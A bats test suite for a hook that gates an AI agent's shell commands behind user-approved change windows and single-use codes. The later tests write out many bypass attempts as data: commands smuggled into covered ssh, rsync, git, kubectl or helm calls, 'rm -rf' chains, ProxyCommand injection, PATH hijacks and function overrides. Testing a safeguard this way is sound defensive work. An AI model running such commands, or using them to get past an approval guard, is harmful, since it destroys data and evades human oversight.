#!/usr/bin/env bats
load helpers

# State functions of 0.8.0 change windows: pending codes per session, the
# window file and the failed marker (hooks/lib/careful.sh).

# lib SNIPPET -- run SNIPPET in $PROJ with common.sh and careful.sh sourced.
lib() {
  run "$MK_BASH" -c ". '$HOOKS/lib/common.sh'; . '$HOOKS/lib/careful.sh'; cd '$PROJ'; mk_resolve_root '{}'; mk_load_config >/dev/null; $1"
}

setup() { mk_project; }

@test "targets_code: order and duplicates do not matter, content does" {
  lib 'a="$(mk_careful_targets_code "host:b
host:a")"; b="$(mk_careful_targets_code "host:a
host:b
host:a")"; c="$(mk_careful_targets_code "host:a")"; printf "%s %s %s" "$a" "$b" "$c"'
  [ "$status" -eq 0 ]
  set -- $output
  [ "$1" = "$2" ] && [ "$1" != "$3" ] && [ "${#1}" -eq 6 ]
}

@test "pending: set then get by code; other code misses; expired is dropped" {
  lib 'mk_careful_pending_set s1 abc123 "host:a
branch:deploy" && mk_careful_pending_get s1 abc123'
  [ "$status" -eq 0 ]
  set -- $output
  [ "$1" = abc123 ] && [ "$3" = host:a ] && [ "$4" = branch:deploy ]
  lib 'mk_careful_pending_get s1 zzzzzz'
  [ "$status" -eq 1 ]
  lib 'mk_careful_pending_get s1 >/dev/null && echo ok'
  [ "$output" = ok ]
  lib 'MK_CF_TTL=-1; mk_careful_pending_set s2 abc123 "host:a"; mk_careful_pending_get s2 abc123; rc=$?; f="$(mk_careful_pending_file s2)"; [ ! -e "$f" ] && echo gone; exit $rc'
  [ "$status" -eq 1 ]
  [ "$output" = gone ]
}

@test "pending: a second set replaces the first" {
  lib 'mk_careful_pending_set s1 aaaaaa "host:a"; mk_careful_pending_set s1 bbbbbb ""; mk_careful_pending_get s1 aaaaaa; echo "rc=$?"; mk_careful_pending_get s1 | cut -d" " -f1; wc -l < "$(mk_careful_pending_file s1)" | tr -d " "'
  printf '%s\n' "$output" | grep -qx 'rc=1'
  printf '%s\n' "$output" | grep -qx 'bbbbbb'
  printf '%s\n' "$output" | grep -qx '1'
}

@test "pending: session id is sanitised in the file name" {
  lib 'mk_careful_pending_file "a/b c"'
  case "$output" in *careful-pending-a_b_c) ;; *) echo "$output"; false ;; esac
}

@test "window: open covers subsets, not extra targets; get prints the line" {
  lib 'mk_careful_window_open s1 30 "host:b
host:a" && mk_careful_window_get s1'
  [ "$status" -eq 0 ]
  set -- $output
  [ "$2" = host:a ] && [ "$3" = host:b ]
  lib 'mk_careful_window_covers s1 "host:a"'; [ "$status" -eq 0 ]
  lib 'mk_careful_window_covers s1 "host:b
host:a"'; [ "$status" -eq 0 ]
  lib 'mk_careful_window_covers s1 "host:a
host:c"'; [ "$status" -eq 1 ]
  lib 'mk_careful_window_covers s1 "host"'; [ "$status" -eq 1 ]
  lib 'mk_careful_window_covers s1 ""'; [ "$status" -eq 1 ]
}

@test "window: invalid minutes or targets write nothing" {
  lib 'mk_careful_window_open s1 0 "host:a"'; [ "$status" -eq 1 ]
  lib 'mk_careful_window_open s1 241 "host:a"'; [ "$status" -eq 1 ]
  lib 'mk_careful_window_open s1 abc "host:a"'; [ "$status" -eq 1 ]
  lib 'mk_careful_window_open s1 5 ""'; [ "$status" -eq 1 ]
  lib 'mk_careful_window_get s1'; [ "$status" -eq 1 ]
}

@test "window: expired window is removed and does not cover" {
  lib 'f="$(mk_careful_window_file s1)"; ( umask 077; printf "%s host:a\n" "$(( $(date +%s) - 5 ))" > "$f" ); mk_careful_window_covers s1 "host:a"; rc=$?; mk_careful_window_get s1; rc2=$?; [ ! -e "$f" ] && echo gone; echo "$rc $rc2"'
  printf '%s\n' "$output" | grep -qx 'gone'
  printf '%s\n' "$output" | grep -qx '1 1'
}

@test "window: close with reason stores it once" {
  lib 'mk_careful_window_open s1 5 "host:a"; mk_careful_window_close s1 "deploy failed
second line"; mk_careful_window_get s1; echo "get=$?"; mk_careful_window_failed s1; echo "f1=$?"; mk_careful_window_failed s1; echo "f2=$?"'
  printf '%s\n' "$output" | grep -qx 'get=1'
  printf '%s\n' "$output" | grep -qx 'deploy failed'
  printf '%s\n' "$output" | grep -qx 'f1=0'
  printf '%s\n' "$output" | grep -qx 'f2=1'
  ! printf '%s\n' "$output" | grep -q 'second line'
}

@test "window: close without reason leaves no failed marker" {
  lib 'mk_careful_window_open s1 5 "host:a"; mk_careful_window_close s1; mk_careful_window_get s1; echo "get=$?"; mk_careful_window_failed s1; echo "f=$?"'
  printf '%s\n' "$output" | grep -qx 'get=1'
  printf '%s\n' "$output" | grep -qx 'f=1'
}

@test "window: symlinked or foreign-owned files are refused" {
  lib 'f="$(mk_careful_window_file s1)"; ln -s "'"$PROJ"'/victim" "$f"; mk_careful_window_open s1 5 "host:a"; echo "rc=$?"; [ ! -e "'"$PROJ"'/victim" ] && echo untouched; mk_careful_window_get s1; echo "get=$?"; rm -f "$f"'
  printf '%s\n' "$output" | grep -qx 'rc=1'
  printf '%s\n' "$output" | grep -qx 'untouched'
  printf '%s\n' "$output" | grep -qx 'get=1'
  lib 'f="$(mk_careful_pending_file s1)"; ln -s "'"$PROJ"'/victim" "$f"; mk_careful_pending_set s1 abc123 "host:a"; echo "rc=$?"; [ ! -e "'"$PROJ"'/victim" ] && echo untouched; rm -f "$f"'
  printf '%s\n' "$output" | grep -qx 'rc=1'
  printf '%s\n' "$output" | grep -qx 'untouched'
}

@test "state regex: careful-pending and careful-window are careful-state" {
  lib 'mk_careful_labels "cat /tmp/memokit-1-careful-window"'
  printf '%s\n' "$output" | grep -qx 'careful-state'
  lib 'mk_careful_labels "cat Careful-Pending-x"'
  printf '%s\n' "$output" | grep -qx 'careful-state'
  lib 'mk_careful_labels "rm /tmp/memokit-1-careful-window-failed"'
  printf '%s\n' "$output" | grep -qx 'careful-state'
}

@test "window/pending: overlong or garbage expiry fails closed and removes the file" {
  for e in 99999999999999999999999 12x ""; do
    lib 'f="$(mk_careful_window_file s1)"; ( umask 077; printf "%s host:a\n" "'"$e"'" > "$f" ); mk_careful_window_covers s1 "host:a"; echo "c=$?"; ( umask 077; printf "%s host:a\n" "'"$e"'" > "$f" ); mk_careful_window_get s1; echo "g=$?"; [ ! -e "$f" ] && echo gone'
    printf '%s\n' "$output" | grep -qx 'c=1'
    printf '%s\n' "$output" | grep -qx 'g=1'
    printf '%s\n' "$output" | grep -qx 'gone'
    lib 'f="$(mk_careful_pending_file s1)"; ( umask 077; printf "abc123 %s host:a\n" "'"$e"'" > "$f" ); mk_careful_pending_get s1 abc123; echo "g=$?"; [ ! -e "$f" ] && echo gone'
    printf '%s\n' "$output" | grep -qx 'g=1'
    printf '%s\n' "$output" | grep -qx 'gone'
  done
}

@test "window: targets are matched literally, never as globs or prefixes" {
  lib 'f="$(mk_careful_window_file s1)"; ( umask 077; printf "%s host:*\n" "$(( $(date +%s) + 300 ))" > "$f" ); mk_careful_window_covers s1 "host:prod.example.com"'
  [ "$status" -eq 1 ]
  lib 'mk_careful_window_open s1 5 "host:ab"; mk_careful_window_covers s1 "host:a"'
  [ "$status" -eq 1 ]
  lib 'mk_careful_window_open s1 5 "host:a*b"'; [ "$status" -eq 1 ]
  lib 'mk_careful_window_open s1 5 "host:a?b"'; [ "$status" -eq 1 ]
  lib 'mk_careful_window_open s1 5 "host:a[b]"'; [ "$status" -eq 1 ]
  lib 'mk_careful_window_open s1 5 "host:a	b"'; [ "$status" -eq 1 ]
}

@test "window: failed marker is refused through a symlink or directory" {
  lib 'ff="$(mk_tmp careful-window-failed-s1)"; ln -s "'"$PROJ"'/victim" "$ff"; mk_careful_window_close s1 "boom"; [ ! -e "'"$PROJ"'/victim" ] && echo untouched; rm -f "$ff"; mkdir "$ff"; mk_careful_window_close s1 "boom"; [ -z "$(ls -A "$ff")" ] && echo emptydir; rmdir "$ff"'
  printf '%s\n' "$output" | grep -qx 'untouched'
  printf '%s\n' "$output" | grep -qx 'emptydir'
}

# 0.8.1 (spec 3c): an expiry later than a writer could have set (window: now
# + 240 min; pending line and request record: now + MK_CF_TTL) is malformed:
# the file is removed and the read exits 1, so a hand-written far-future
# expiry buys nothing.
@test "window: an expiry past now + 240 min is malformed and removed; within it is kept" {
  lib 'f="$(mk_careful_window_file s1)"; ( umask 077; printf "%s host:prod\n" "$(( $(date +%s) + 241 * 60 ))" > "$f" ); mk_careful_window_get s1; echo "g=$?"; [ ! -e "$f" ] && echo gone'
  printf '%s\n' "$output" | grep -qx 'g=1' || { echo "$output"; false; }
  printf '%s\n' "$output" | grep -qx 'gone'
  lib 'f="$(mk_careful_window_file s1)"; ( umask 077; printf "%s host:prod\n" "$(( $(date +%s) + 239 * 60 ))" > "$f" ); mk_careful_window_get s1; echo "g=$?"; [ -e "$f" ] && echo kept'
  printf '%s\n' "$output" | grep -qx 'g=0' || { echo "$output"; false; }
  printf '%s\n' "$output" | grep -qx 'kept'
  printf '%s\n' "$output" | grep -q ' host:prod$'
  # a window opened for the full 240 minutes reads back
  lib 'mk_careful_window_open s2 240 "host:prod" && mk_careful_window_get s2 >/dev/null && echo ok'
  [ "$output" = ok ]
}

@test "pending: an expiry past now + MK_CF_TTL is malformed and removed (line and request record)" {
  lib 'f="$(mk_careful_pending_file s1)"; ( umask 077; printf "abc123 %s host:a\n" "$(( $(date +%s) + MK_CF_TTL + 60 ))" > "$f" ); mk_careful_pending_get s1; echo "g=$?"; [ ! -e "$f" ] && echo gone'
  printf '%s\n' "$output" | grep -qx 'g=1' || { echo "$output"; false; }
  printf '%s\n' "$output" | grep -qx 'gone'
  # flagged ("!") line too
  lib 'f="$(mk_careful_pending_file s1)"; ( umask 077; printf "abc123 %s! host:a\n" "$(( $(date +%s) + MK_CF_TTL + 60 ))" > "$f" ); mk_careful_pending_get s1 abc123; echo "g=$?"; [ ! -e "$f" ] && echo gone'
  printf '%s\n' "$output" | grep -qx 'g=1' || { echo "$output"; false; }
  printf '%s\n' "$output" | grep -qx 'gone'
  lib 'r="$(mk_careful_pending_req_file s1)"; ( umask 077; printf "abc123 %s\n" "$(( $(date +%s) + MK_CF_TTL + 60 ))" > "$r" ); mk_careful_pending_req_get s1; echo "g=$?"; [ ! -e "$r" ] && echo gone'
  printf '%s\n' "$output" | grep -qx 'g=1' || { echo "$output"; false; }
  printf '%s\n' "$output" | grep -qx 'gone'
  # what the writers set still reads back
  lib 'mk_careful_pending_set s2 abc123 "host:a" && mk_careful_pending_req_set s2 abc123 && mk_careful_pending_get s2 abc123 >/dev/null && mk_careful_pending_req_get s2'
  [ "$output" = abc123 ]
}

# --- guard-destructive ---
# The hook asks for a change plan (CF_REMOTE*), lets a command through when
# an open window covers every remote target of it, and writes the pending
# code for main-session denies.

WCFG='{"version":1,"project":{"name":"D","tag":"DMO"},"language":"en",
"remote":{"deployBranches":["deploy","public-release"],"hosts":["31.210.53.162","prod.example.com"],"windowMinutes":30}}'
WSID="sess-0001"

# tp CMD [TOOL_USE_ID] [EXTRA_JSON] -- Bash payload with session, transcript
# and tool_use_id; EXTRA_JSON is merged in ({"agent_id":"a1"},
# {"tool_input":{"run_in_background":true}}).
tp() {
  local x="${3:-}"
  [ -n "$x" ] || x='{}'
  jq -nc --arg c "$1" --arg cwd "$PROJ" --arg s "$WSID" --arg t "$PROJ/$WSID.jsonl" \
    --arg tu "${2:-toolu_01abc}" --argjson x "$x" \
    '{tool_name:"Bash",tool_input:{command:$c},cwd:$cwd,session_id:$s,transcript_path:$t,tool_use_id:$tu} * $x'
}
gd() { run_hook guard-destructive.sh "$(tp "$@")"; }
# code_of REASON -- the 6-hex code in 'onay <code>' (CF_REMOTE*) or 'approve <code>'.
code_of() { printf '%s' "$1" | grep -oE "'(onay|approve) [0-9a-f]{6}'" | head -n 1 | grep -oE '[0-9a-f]{6}'; }
pending_file_exists() { lib 'f="$(mk_careful_pending_file '"$WSID"')"; [ -e "$f" ]'; }
open_window() { lib "mk_careful_window_open $WSID 30 '$1'"; [ "$status" -eq 0 ]; }
marker() { lib "f=\"\$(mk_tmp 'careful-window-running-$1')\"; [ -f \"\$f\" ] && cat \"\$f\""; }

@test "deny: first remote command -> CF_REMOTE with code, targets, window minutes; pending holds code and targets" {
  mk_project "$WCFG"
  gd "ssh prod.example.com 'systemctl restart x'"
  [ "$(decision)" = deny ]
  r="$(reason)"
  printf '%s' "$r" | grep -qF 'remote-mutate → host:prod.example.com' || { echo "$r"; false; }
  printf '%s' "$r" | grep -qF 'CHANGE PLAN'
  printf '%s' "$r" | grep -qF 'memokit-window.sh request'
  printf '%s' "$r" | grep -qF '30 minutes'
  printf '%s' "$r" | grep -qF 'docs/DEPLOYS.md'
  printf '%s' "$r" | grep -qF 'onaylıyorum'
  c="$(code_of "$r")"
  [ "${#c}" -eq 6 ] || { echo "no code: $r"; false; }
  lib "mk_careful_targets_code 'host:prod.example.com'"
  [ "$output" = "$c" ]
  lib "mk_careful_pending_get $WSID $c"
  [ "$status" -eq 0 ]
  set -- $output
  [ "$1" = "$c" ] && [ "$3" = host:prod.example.com ] && [ "$#" -eq 3 ]
}

@test "deny: subagent deny writes no pending" {
  mk_project "$WCFG"
  gd "ssh prod.example.com 'systemctl restart x'" toolu_01 '{"agent_id":"a1"}'
  [ "$(decision)" = deny ]
  pending_file_exists; [ "$status" -eq 1 ]
  gd "rm -rf ./data" toolu_02 '{"agent_id":"a1"}'
  [ "$(decision)" = deny ]
  pending_file_exists; [ "$status" -eq 1 ]
}

@test "pass: open window covers; running marker written with tool_use_id" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  gd "ssh prod.example.com 'systemctl restart x'" toolu_01pass
  [ "$status" -eq 0 ] && [ -z "$output" ] || { echo "$output"; false; }
  marker toolu_01pass
  [ "$status" -eq 0 ]
  [ "$output" = "ssh prod.example.com 'systemctl restart x'" ]
  # the tool_use_id is sanitised into the file name
  gd "ssh prod.example.com 'systemctl restart y'" 'toolu/../x y'
  [ -z "$output" ]
  marker 'toolu____x_y'
  [ "$output" = "ssh prod.example.com 'systemctl restart y'" ] || { echo "$output"; false; }
  # a multi-line command: the marker holds its first line
  gd "ssh prod.example.com 'systemctl restart x' &&
ssh prod.example.com 'systemctl restart z'" toolu_03
  [ -z "$output" ] || { echo "$output"; false; }
  marker toolu_03
  [ "$output" = "ssh prod.example.com 'systemctl restart x' &&" ]
  # a trailing separator changes nothing
  gd "ssh prod.example.com 'systemctl restart x';" toolu_04
  [ -z "$output" ] || { echo "$output"; false; }
}

@test "pass: same-segment coverage" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  gd "ssh prod.example.com 'rm -rf /srv/app/releases/old'" toolu_02
  [ "$status" -eq 0 ] && [ -z "$output" ] || { echo "$output"; false; }
  gd "git push origin deploy" toolu_03
  [ "$(decision)" = deny ]
}

@test "deny: local segment is not covered" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  cmd="rm -rf ./data && ssh prod.example.com 'systemctl restart app'"
  gd "$cmd" toolu_04
  [ "$(decision)" = deny ]
  r="$(reason)"
  printf '%s' "$r" | grep -qF 'rm-recursive' || { echo "$r"; false; }
  lacks "$r" 'CHANGE PLAN'
  lacks "$r" 'remote-mutate'
  marker toolu_04; [ "$status" -eq 1 ]
  # the ordinary code of the full command, also in the pending file
  lib "mk_careful_code \"$cmd\""
  c="$output"
  [ "$(code_of "$r")" = "$c" ]
  lib "mk_careful_pending_get $WSID $c"
  [ "$status" -eq 0 ]
}

@test "deny: extra target -> CF_REMOTE_EXTRA names it" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  gd "ssh 31.210.53.162 'systemctl restart x'" toolu_05
  [ "$(decision)" = deny ]
  r="$(reason)"
  printf '%s' "$r" | grep -qF 'does not cover host:31.210.53.162' || { echo "$r"; false; }
  c="$(code_of "$r")"
  lib "mk_careful_targets_code 'host:31.210.53.162'"
  [ "$output" = "$c" ]
  lib "mk_careful_pending_get $WSID $c"
  [ "$status" -eq 0 ]
  marker toolu_05; [ "$status" -eq 1 ]
  # two targets, one covered: only the missing one is named, the code is for both
  gd "ssh 31.210.53.162 'systemctl restart x' && ssh prod.example.com 'systemctl restart x'" toolu_06
  r="$(reason)"
  printf '%s' "$r" | grep -qF 'does not cover host:31.210.53.162:' || { echo "$r"; false; }
  lib "mk_careful_targets_code 'host:31.210.53.162
host:prod.example.com'"
  [ "$(code_of "$r")" = "$output" ]
}

@test "deny: run_in_background inside a window -> CF_REMOTE_BG" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  gd "ssh prod.example.com 'systemctl restart x'" toolu_07 '{"tool_input":{"run_in_background":true}}'
  [ "$(decision)" = deny ]
  r="$(reason)"
  printf '%s' "$r" | grep -qF 'background' || { echo "$r"; false; }
  printf '%s' "$r" | grep -qF 'host:prod.example.com'
  marker toolu_07; [ "$status" -eq 1 ]
}

@test "deny: failed marker -> CF_REMOTE_FAILED carries the failed command" {
  mk_project "$WCFG"
  lib "mk_careful_window_open $WSID 30 host:prod.example.com && mk_careful_window_close $WSID \"ssh prod.example.com 'bad'\""
  gd "ssh prod.example.com 'systemctl restart x'" toolu_08
  [ "$(decision)" = deny ]
  r="$(reason)"
  printf '%s' "$r" | grep -qF "ssh prod.example.com 'bad'" || { echo "$r"; false; }
  printf '%s' "$r" | grep -qF 'host:prod.example.com'
  [ -n "$(code_of "$r")" ]
  # reported once: the next deny is the plain request
  gd "ssh prod.example.com 'systemctl restart x'" toolu_09
  lacks "$(reason)" "'bad'"
  printf '%s' "$(reason)" | grep -qF 'CHANGE PLAN'
}

@test "grant: an exact single-use grant still passes a remote command" {
  mk_project "$WCFG"
  cmd="ssh prod.example.com 'systemctl restart x'"
  lib "mk_careful_grant \"\$(mk_careful_code \"$cmd\")\""
  gd "$cmd" toolu_10
  [ "$status" -eq 0 ] && [ -z "$output" ] || { echo "$output"; false; }
  gd "$cmd" toolu_11
  [ "$(decision)" = deny ]
}

@test "grant: a subagent or a background run never consumes it; the main session still can" {
  mk_project "$WCFG"
  cmd="ssh prod.example.com 'systemctl restart x'"
  lib "mk_careful_grant \"\$(mk_careful_code \"$cmd\")\""
  gd "$cmd" toolu_20 '{"agent_id":"a1"}'
  [ "$(decision)" = deny ]
  gd "$cmd" toolu_21 '{"tool_input":{"run_in_background":true}}'
  [ "$(decision)" = deny ]
  gd "$cmd" toolu_22
  [ "$status" -eq 0 ] && [ -z "$output" ] || { echo "$output"; false; }
}

@test "ordinary deny: pending holds the code with no targets; careful-state deny writes none" {
  mk_project "$WCFG"
  gd "cat /tmp/memokit-1-careful-grants"
  [ "$(decision)" = deny ]
  pending_file_exists; [ "$status" -eq 1 ]
  gd "rm -rf ./data"
  [ "$(decision)" = deny ]
  c="$(code_of "$(reason)")"
  [ "${#c}" -eq 6 ]
  lib "mk_careful_pending_get $WSID $c"
  [ "$status" -eq 0 ]
  set -- $output
  [ "$#" -eq 2 ]
}

@test "subagent: an open covering window never lets a remote command through" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  gd "ssh prod.example.com 'systemctl restart x'" toolu_12 '{"agent_id":"a1"}'
  [ "$(decision)" = deny ]
  marker toolu_12; [ "$status" -eq 1 ]
  pending_file_exists; [ "$status" -eq 1 ]
}

@test "expired window: the remote command asks for a plan again" {
  mk_project "$WCFG"
  lib 'f="$(mk_careful_window_file '"$WSID"')"; ( umask 077; printf "%s host:prod.example.com\n" "$(( $(date +%s) - 5 ))" > "$f" )'
  gd "ssh prod.example.com 'systemctl restart x'" toolu_13
  [ "$(decision)" = deny ]
  printf '%s' "$(reason)" | grep -qF 'CHANGE PLAN'
}

@test "running marker: an unsafe marker path is never followed and the command is denied" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  lib "ln -s '$PROJ/victim' \"\$(mk_tmp careful-window-running-toolu_14)\""
  gd "ssh prod.example.com 'systemctl restart x'" toolu_14
  [ "$(decision)" = deny ]
  [ ! -e "$PROJ/victim" ]
  lib "rm -f \"\$(mk_tmp careful-window-running-toolu_14)\""
}

@test "covered but longer than MK_GD_MAX_STRIP segments: plan request with the shape hint, no marker (timeout bound)" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  c=""; i=0
  while [ "$i" -lt 19 ]; do c="${c}ssh prod.example.com 'systemctl restart a$i'
"; i=$((i + 1)); done
  gd "${c%?}" toolu_15
  [ -z "$output" ] || { echo "19 segments: $output"; false; }
  gd "${c}ssh prod.example.com 'systemctl restart b'" toolu_15b
  [ -z "$output" ] || { echo "20 segments: $output"; false; }
  gd "${c}ssh prod.example.com 'systemctl restart b'
ssh prod.example.com 'systemctl restart c'" toolu_16
  [ "$(decision)" = deny ]
  printf '%s' "$(reason)" | grep -qF 'remote-mutate'
  printf '%s' "$(reason)" | grep -qF 'cannot pass a change window'
  marker toolu_16; [ "$status" -eq 1 ]
}

@test "too-large: a remote command past the structural bounds never passes a window" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  # more than MK_RM_MAX_SEGS (40) segments under 8 KiB: too-large (round 4;
  # before it, more than 500 segments gave unparsed)
  c="ssh prod.example.com 'systemctl restart x';"; i=0
  while [ "$i" -lt 41 ]; do c="${c}echo h$i;"; i=$((i + 1)); done
  gd "$c" toolu_17
  [ "$(decision)" = deny ]
  printf '%s' "$(reason)" | grep -qF 'too-large'
  lacks "$(reason)" 'CHANGE PLAN'
  marker toolu_17; [ "$status" -eq 1 ]
}

@test "no remote config: remote-looking commands keep today's behaviour" {
  mk_project '{"version":1,"project":{"name":"D","tag":"DMO"},"language":"en"}'
  gd "ssh prod.example.com 'systemctl restart x'"
  [ -z "$output" ]
  gd "rm -rf ./data"
  printf '%s' "$(reason)" | grep -qF 'rm-recursive'
  lacks "$(reason)" 'CHANGE PLAN'
}

# --- fix round 1: window-pass bypasses (review C1-C3, I1; security S2-S4) ---

# in_window_denied TUID CMD... -- each CMD is denied inside a window and
# leaves no running marker.
in_window_denied() {
  local tu="$1" c; shift
  for c in "$@"; do
    gd "$c" "$tu"
    [ "$(decision)" = deny ] || { echo "allowed in window: $c -> [$output]"; return 1; }
    marker "$tu"
    [ "$status" -eq 1 ] || { echo "marker written for: $c"; return 1; }
  done
}
all_targets='host:31.210.53.162
host:prod.example.com
branch:deploy
branch:public-release
k8s'

@test "C1: a glued or spaced background & next to a covered ssh never passes" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  in_window_denied toolu_c1 \
    "ssh prod.example.com 'systemctl restart x'&rm -rf ./data" \
    "ssh prod.example.com 'systemctl restart x' &rm -rf ./data" \
    "ssh prod.example.com 'systemctl restart x'&git push -f origin main" \
    "ssh prod.example.com 'systemctl restart x'&git reset --hard HEAD~3" \
    "ssh prod.example.com 'systemctl restart x' & ssh prod.example.com 'systemctl restart y'" \
    "ssh prod.example.com 'systemctl restart x' |& tee log"
  gd "ssh prod.example.com 'systemctl restart x'&rm -rf ./data" toolu_c1
  printf '%s' "$(reason)" | grep -qF 'rm-recursive'
}

@test "C2: a tool word in argument position never strips the segment" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  in_window_denied toolu_c2 \
    "rm -rf ./data ssh prod.example.com 'systemctl restart x'" \
    "git reset --hard HEAD~5 ssh prod.example.com 'systemctl restart x'" \
    "git push -f origin main ssh prod.example.com 'systemctl restart x'" \
    "find . -delete -name ssh prod.example.com 'systemctl restart x'" \
    "echo ssh prod.example.com 'systemctl restart x'" \
    "! ssh prod.example.com 'systemctl restart x'"
  gd "rm -rf ./data ssh prod.example.com 'systemctl restart x'" toolu_c2
  printf '%s' "$(reason)" | grep -qF 'rm-recursive'
  lacks "$(reason)" 'CHANGE PLAN'
}

@test "C3: local code inside a covered ssh/rsync segment never passes" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  in_window_denied toolu_c3 \
    'ssh prod.example.com "systemctl restart $(rm -rf ./data)"' \
    'ssh prod.example.com "systemctl restart `rm -rf ./data`"' \
    "ssh prod.example.com 'systemctl restart x' < <(rm -rf ./data)" \
    "ssh prod.example.com 'systemctl restart x' > >(rm -rf ./data)" \
    "ssh -o ProxyCommand='rm -rf ./data' prod.example.com 'systemctl restart x'" \
    "ssh -o proxycommand='sh x' prod.example.com 'systemctl restart x'" \
    "ssh -oLocalCommand='rm -rf ./data' -oPermitLocalCommand=yes prod.example.com 'systemctl restart x'" \
    "rsync -az -e 'sh -c \"rm -rf ./data\"' ./ prod.example.com:/srv/app/" \
    "rsync -aze 'sh -c x' ./ prod.example.com:/srv/app/" \
    "rsync -az --rsh='sh -c x' ./ prod.example.com:/srv/app/" \
    "rsync -az --rsync-path='rm -rf ./data' ./ prod.example.com:/srv/app/" \
    "ssh -F ./evil.conf prod.example.com 'systemctl restart x'" \
    "scp -S ./evil ./f prod.example.com:/srv/f" \
    "ssh prod.example.com 'systemctl restart x' | tee log" \
    "ssh prod.example.com 'systemctl restart x' || rm -rf ./data" \
    "env X=1 ssh prod.example.com 'systemctl restart x'" \
    "X=1 ssh prod.example.com 'systemctl restart x'"
}

@test "C3: git and helm local-exec shapes never pass a window holding every target" {
  mk_project "$WCFG"
  git -C "$PROJ" remote add origin https://example.com/x.git
  open_window "$all_targets"
  gd "git push origin deploy" toolu_g0
  [ -z "$output" ] || { echo "plain push denied: $output"; false; }
  gd "git -C $PROJ push origin deploy" toolu_g1
  [ -z "$output" ] || { echo "git -C push denied: $output"; false; }
  gd "kubectl -n app apply -f k8s/app.yaml" toolu_g3
  [ -z "$output" ] || { echo "kubectl apply denied: $output"; false; }
  in_window_denied toolu_g2 \
    "GIT_SSH_COMMAND='rm -rf ./data' git push origin deploy" \
    "git -c core.sshCommand='rm -rf ./data' push origin deploy" \
    "git -c x=y push origin deploy" \
    "git -c alias.p='!rm -rf ./data' p origin deploy" \
    "git -C /tmp push origin deploy" \
    "git --git-dir=/tmp/x push origin deploy" \
    "git push --receive-pack='rm -rf ./data' origin deploy" \
    "git push --exec='rm -rf ./data' origin deploy" \
    "kubectl --kubeconfig=/x apply -f k8s/app.yaml" \
    "kubectl edit deploy/app" \
    "kubectl cp pod:/x ./data" \
    "kubectl my-plugin apply" \
    "helm upgrade app ./chart --post-renderer ./evil" \
    "/usr/bin/git push origin deploy"
}

@test "window pass: harmless shapes around a covered ssh still pass" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  local c n=0
  for c in "ssh prod.example.com 'systemctl restart x' 2>&1" \
           "echo deploying && ssh prod.example.com 'systemctl restart x'" \
           "ssh prod.example.com 'systemctl stop x; systemctl start x'" \
           "sudo ssh prod.example.com 'systemctl restart x'" \
           "env ssh prod.example.com 'systemctl restart x'" \
           "ssh -o StrictHostKeyChecking=no -p 2222 -i ~/.ssh/id_ed25519 prod.example.com 'systemctl restart x'" \
           "ssh -oConnectTimeout=5 -qT prod.example.com 'systemctl restart x'" \
           "rsync -avz --delete ./dist/ prod.example.com:/srv/app/" \
           "rsync -az -e ssh ./dist/ prod.example.com:/srv/app/" \
           "rsync -az -e 'ssh -p 2222' --exclude=.git ./dist/ prod.example.com:/srv/app/" \
           "scp -P 2222 ./dist/app.tgz prod.example.com:/srv/app/"; do
    n=$((n + 1))
    gd "$c" "toolu_ok$n"
    [ -z "$output" ] || { echo "denied: $c -> $output"; false; }
    marker "toolu_ok$n"; [ "$status" -eq 0 ]
  done
}

@test "round 2: redirections, wrappers, paths and options outside the allowlists never pass" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  in_window_denied toolu_r2 \
    "ssh prod.example.com 'systemctl restart x' > /tmp/out.log" \
    "ssh prod.example.com 'systemctl restart x' >> ./log" \
    "ssh prod.example.com 'bash -s' < ./script.sh" \
    "ssh prod.example.com 'bash -s' <<< 'rm -rf /'" \
    "ssh prod.example.com 'systemctl restart x' &>/dev/null" \
    "ssh prod.example.com 'systemctl restart x' >| ./f" \
    "cd /srv && ssh prod.example.com 'systemctl restart x'" \
    "export PATH=/tmp/evil; ssh prod.example.com 'systemctl restart x'" \
    "PATH=/tmp/evil; ssh prod.example.com 'systemctl restart x'" \
    "/usr/bin/ssh prod.example.com 'systemctl restart x'" \
    "./ssh prod.example.com 'systemctl restart x'" \
    "env -S ssh prod.example.com 'systemctl restart x'" \
    "sudo -u deploy ssh prod.example.com 'systemctl restart x'" \
    "nice -n 5 ssh prod.example.com 'systemctl restart x'" \
    "ssh -o 'ProxyCommand=x' prod.example.com y" \
    "ssh -oProx\"yCommand\"=x prod.example.com y" \
    "ssh -o Prox'y'Command=x prod.example.com y" \
    "ssh -I x prod.example.com 'systemctl restart x'" \
    "ssh -F cfg prod.example.com 'systemctl restart x'" \
    "ssh -J jump prod.example.com 'systemctl restart x'" \
    "ssh prod.example.com -F cfg 'systemctl restart x'" \
    "ssh -o Port=\$P prod.example.com 'systemctl restart x'" \
    "ssh -vF cfg prod.example.com 'systemctl restart x'" \
    "rsync -az -e 'sh -c x' ./ prod.example.com:/srv/app/" \
    "rsync -az --rsync-path=x ./ prod.example.com:/srv/app/" \
    "rsync -az --remove-source-files ./ prod.example.com:/srv/app/" \
    "ssh prod.example.com 'systemctl restart x' \\
-F cfg" \
    "ssh prod.example.com -o 'User=x;' -F evil y" \
    "ssh 'prod.example.com
' -F evil y" \
    "ssh() { python3 x.py; }; ssh prod.example.com 'systemctl restart x'"
}

@test "round 2: careful-state in a covered command is refused as careful-state" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  gd "ssh prod.example.com x > /tmp/memokit-1-careful-window" toolu_cs
  [ "$(decision)" = deny ]
  printf '%s' "$(reason)" | grep -qF 'approval files' || { echo "$(reason)"; false; }
  marker toolu_cs; [ "$status" -eq 1 ]
}

@test "malformed remote shape with only remote labels: plan request with the shape hint" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  gd "ssh prod.example.com 'systemctl restart x' | tee log" toolu_h
  [ "$(decision)" = deny ]
